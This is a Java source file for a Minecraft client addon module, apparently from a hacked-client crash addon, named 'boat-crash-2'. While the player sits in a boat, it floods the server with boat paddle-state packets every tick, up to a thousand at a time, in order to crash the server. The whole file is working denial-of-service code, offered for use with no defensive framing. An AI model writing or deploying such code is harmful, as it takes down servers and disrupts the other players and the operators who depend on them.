package WideCat.MeteorCrashAddon.modules;

import WideCat.MeteorCrashAddon.MeteorCrashAddon;
import minegame159.meteorclient.events.world.TickEvent;
import meteordevelopment.orbit.EventHandler;
import minegame159.meteorclient.modules.Module;
import minegame159.meteorclient.settings.*;
import minegame159.meteorclient.utils.player.ChatUtils;
import net.minecraft.entity.Entity;
import net.minecraft.entity.vehicle.BoatEntity;
import net.minecraft.network.packet.c2s.play.BoatPaddleStateC2SPacket;

import java.util.Objects;

public class BoatCrash2 extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("How many packets to send to the server per tick.")
            .defaultValue(100)
            .min(1)
            .sliderMax(1000)
            .build()
    );

    BoatPaddleStateC2SPacket boat_packet = new BoatPaddleStateC2SPacket(true, true);

    public BoatCrash2() {
        super(MeteorCrashAddon.CATEGORY, "boat-crash-2", "Tries to crash the server when you are in a boat.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        Entity boat = mc.player.getVehicle();
        if (!(boat instanceof BoatEntity)) {
            ChatUtils.moduleError(this, "You must be in a boat - disabling.");
            toggle();
            return;
        }

        for (int i = 0; i < amount.get(); i++) {
            Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(boat_packet);
        }
    }

}
